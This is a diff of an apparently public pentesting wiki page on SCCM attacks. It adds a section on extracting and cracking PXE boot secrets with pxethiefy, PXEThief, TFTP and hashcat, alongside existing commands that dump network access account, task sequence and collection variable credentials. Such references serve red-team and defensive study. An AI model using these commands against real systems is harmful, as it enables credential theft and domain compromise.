@@ -9,11 +9,9 @@ Currently there are three different pathways for privilege escalation routes in 
 * SCCM site takeover: a NTLM authentication obtained from the SCCM primary site server can be relayed to the SMS Provider or the MSSQL server in order to compromise the SCCM infrastructure.
 * SCCM site takeover from a passive site server: as describer by [Garrett Foster](https://twitter.com/garrfoster) in this [article](https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43), when a passive site server is setup for high availability purpose, its machine account **must** be a member of the local Administrators group on the active site server. It must also be administrator on all the site system deployed in the site, including the MSSQL database
 
-## Practice
-
 ### Credential harvesting
 
-The following SCCM components can contain credentials:
+The following SCCM components can be found on SCCM clients and may contain credentials
 
 * Device Collection variables
 * TaskSequence variables
@@ -32,7 +30,7 @@ NAA doesn't need to be privileged on the domain, but it can happen that administ
 It is worth to note that, even after deleting or changing the NAA in the SCCM configuration, the binary file still contains the encrypted credentials on the enrolled computers.
 
 {% tabs %}
-{% tab title="UNIX-based" %}
+{% tab title="UNIX-like" %}
 ### SystemDPAPIdump
 
 From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, [SystemDPAPIdump.py](https://github.com/fortra/impacket/pull/1137) (Python) can be used to decipher via DPAPI the WMI blob related to SCCM and retrieve the stored credentials. Additionally, the tool can also extract SYSTEM DPAPI credentials.
@@ -112,7 +110,7 @@ python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -targ
 ```
 {% endtab %}
 
-{% tab title="From Windows" %}
+{% tab title="Windows" %}
 From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#), [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI), [Mimikatz](https://github.com/gentilkiwi/mimikatz) (C) or a PowerShell command, can be used with, administrative rights, to extract the NAA credentials locally.
 
 ```powershell
@@ -148,7 +146,7 @@ SharpSCCM.exe get secretes
 TaskSequence are steps that can be configured by an administrator to perform specific actions, for example "Sequence for adding a machine to the domain". Think of it as a script that runs. These TaskSequences can contain variables that can contain credentials. These sequences can use device collection variables (presented in the next section) as conditions.
 
 {% tabs %}
-{% tab title="UNIX-based" %}
+{% tab title="UNIX-like" %}
 From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used to extract the TaskSequence variables remotely.
 
 ```powershell
@@ -160,7 +158,7 @@ python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -targ
 ```
 {% endtab %}
 
-{% tab title="From Windows" %}
+{% tab title="Windows" %}
 From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) or a PowerShell command can be used with, administrative rights, to extract the TaskSequence variables locally.
 
 ```powershell
@@ -187,7 +185,7 @@ SharpSCCM.exe get secrets
 Devices enrolled in an SCCM environment can be grouped by collection. These exist by default, but administrators can create custom collections (for example "Server 2012 devices"), and add variables for these collections that will be used, for example, during application deployement to check some conditions. These variables may very well contain credentials and be found locally on the clients.
 
 {% tabs %}
-{% tab title="UNIX-based" %}
+{% tab title="UNIX-like" %}
 From UNIX-like systems, with administrative privileges over a device enrolled in the SCCM environment, [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (Python) can be used to extract the TaskSequence variables remotely.
 
 ```powershell
@@ -199,12 +197,11 @@ python3 sccmhunter.py dpapi -u $USER -p $PASSWORD -d $DOMAIN -dc-ip $DC_IP -targ
 ```
 {% endtab %}
 
-{% tab title="From Windows" %}
+{% tab title="Windows" %}
 From a Windows machine enrolled in the SCCM environment, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) or a PowerShell command can be used with, administrative rights, to extract the collection variables locally.
 
 ```powershell
 # Locally from WMI 
-
 Get-WmiObject -Namespace ROOT\ccm\policy\Machine\ActualConfig -Class CCM_CollectionVariable
 
 # Locally from CIM store
@@ -217,6 +214,110 @@ SharpSCCM.exe local secrets -m wmi
 {% endtabs %}
 
 <figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+### PXE/OSD (Operating System Deployment)
+
+#### Credential harvesting
+
+The Pre-Boot Execution Environment (PXE) is a mechanism for booting a computer over the network. Specifically, instead of booting from a CD drive, USB key or hard disk and finding the boot program, the PC will use the network to read such a program from the PXE server.
+
+Several secrets could be retreived from Operating System Deployment (OSD)
+
+* Collection variables
+* Account to write image to SMB share
+* Account to pull files from SMB share
+* Set local admin password
+* Run arbitrary command
+* Account to join the domain (Apply Network Settings)
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+#### No Password
+
+Without PXE password protection, we can use [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy) (Python) as follow, to extract secrets from the Operating System Deployment.
+
+```bash
+sudo python3 pxethiefy.py explore -i eth0
+```
+
+#### Password Protected
+
+If a PXE password is set, we can use [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy) (Python) as follow. It will automaticly download encrypted files and extract the hash.
+
+```bash
+sudo python3 pxethiefy.py explore -i eth0
+```
+
+We can then try to crack it  using Christopher Panayi’s [hashcat module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module).
+
+```bash
+# Seting up Hashcat 
+cd /workspace
+git clone https://github.com/hashcat/hashcat.git
+git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
+cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
+cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
+cd hashcat
+git checkout -b v6.2.5 tags/v6.2.5
+make
+
+# Crack the hash
+hashcat/hashcat -m 19850 --force -a 0 /workspace/pxe_hash /usr/share/wordlists/rockyou.txt
+```
+
+Decrypt the file using the found password
+
+```bash
+pxethiefy.py decrypt -p "password" -f ./2023.05.05.10.43.44.0001.{85CA0850-35DC-4A1F-A0B8-8A546B317DD1}.boot.var
+```
+{% endtab %}
+
+{% tab title="Windows" %}
+#### No Password
+
+Without PXE password protection, we can use [PXEThief](https://github.com/MWR-CyberSec/PXEThief) as follow, to extract secrets from the Operating System Deployment.
+
+```powershell
+python.exe pxethief.py 2 $SCCM_IP
+```
+
+#### Password Protected
+
+If PXE password is set, we can start with [PXEThief](https://github.com/MWR-CyberSec/PXEThief)
+
+```powershell
+python.exe pxethief.py 2 $SCCM_IP
+```
+
+Download the encrypted files specified by PXEThief, and print the hash
+
+```powershell
+# Retreive files
+tftp -i 192.168.33.11 GET "\SMSTemp\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var" "2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var"
+
+# Get the hash
+python.exe pxethief.py 5 '.\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var'
+```
+
+We can then try to crack it  using Christopher Panayi’s [hashcat module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module). (check the UNIX-like tab for more details).
+
+Decrypt the file using the found password
+
+```powershell
+py.exe pxethief.py 3 ".\2024.03.28.03.27.34.0001.{BC3AEB9D-2A6C-46FB-A13E-A5EEF11ABACD}.boot.var" password
+```
+{% endtab %}
+{% endtabs %}
+
+#### Missconfiguration
+
+{% tabs %}
+{% tab title="F8-Debugging" %}
+If "Enable command support" is enabled, we can spawn a shell during OS deployment by pressing F8.&#x20;
+
+<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+{% endtab %}
+{% endtabs %}
 
 ### Authentication Coercion via Client Push Installation
 
